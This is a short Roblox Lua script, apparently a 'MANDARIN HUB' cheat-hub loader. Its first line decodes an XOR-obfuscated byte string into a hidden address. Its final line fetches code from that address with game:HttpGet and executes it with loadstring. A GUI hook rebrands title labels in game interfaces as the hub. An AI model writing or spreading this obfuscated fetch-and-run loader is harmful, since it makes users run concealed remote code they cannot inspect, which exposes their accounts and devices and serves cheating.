
--[[ STAGE 2: VISUAL CORE ]]
local AXdUSIu1KGVSO_TXME_T="\189\175\173\175\082\153\146\144\091\170\066\153\086\090\069\095\072\089\076\076\064\113\070\112\119\127\076\121\097\189\118\096\096\164\107\104\111\098\108\106\016\106\027\028\017\092\023\005\028\024\006\048\028\015\013\112\048\010\048\057\126\028\001\048\024\008\009\056\050\051\004\010\009\036\053\210\214\210\214\206\061\206\223\216\210\204\244\245\202\206\202\039\242\247\033\039\041\046\044\041\233\150\224"local xYgK5agiH9K7Oto=83 local OeL5GgXIsvm2EZn3FnMC=107 local kklpw69qq76woLB=1 local RlnZzixHWg216Ef44gIhsJ=2 local bmBMUL3hhhcG=25 local AnUqt7YJJBqq8HhxiM2=false local zWPSKbkEBuhgXMDj7szy=bit32 and bit32.bxor if not zWPSKbkEBuhgXMDj7szy then zWPSKbkEBuhgXMDj7szy=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local NIZUClewJkor_mKrXWx={}for qctJOsAMj5BUT4GaIOX5uC=1,#AXdUSIu1KGVSO_TXME_T do local gBHf046UVUHpngy8Itz=string.byte(AXdUSIu1KGVSO_TXME_T,qctJOsAMj5BUT4GaIOX5uC)local sLg19aanQvkQZ=(OeL5GgXIsvm2EZn3FnMC+(qctJOsAMj5BUT4GaIOX5uC*RlnZzixHWg216Ef44gIhsJ)+bmBMUL3hhhcG)%256 if kklpw69qq76woLB==0 then gBHf046UVUHpngy8Itz=(gBHf046UVUHpngy8Itz-sLg19aanQvkQZ)%256 NIZUClewJkor_mKrXWx[qctJOsAMj5BUT4GaIOX5uC]=string.char(zWPSKbkEBuhgXMDj7szy(gBHf046UVUHpngy8Itz,xYgK5agiH9K7Oto))else gBHf046UVUHpngy8Itz=zWPSKbkEBuhgXMDj7szy(gBHf046UVUHpngy8Itz,xYgK5agiH9K7Oto)NIZUClewJkor_mKrXWx[qctJOsAMj5BUT4GaIOX5uC]=string.char((gBHf046UVUHpngy8Itz-sLg19aanQvkQZ)%256)end end local EXgyomBqiqCsSHjuKud8RU=table.concat(NIZUClewJkor_mKrXWx)if AnUqt7YJJBqq8HhxiM2 then EXgyomBqiqCsSHjuKud8RU=string.reverse(EXgyomBqiqCsSHjuKud8RU)end local KsAXoNSAqv77Wq=EXgyomBqiqCsSHjuKud8RU
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(KsAXoNSAqv77Wq))()
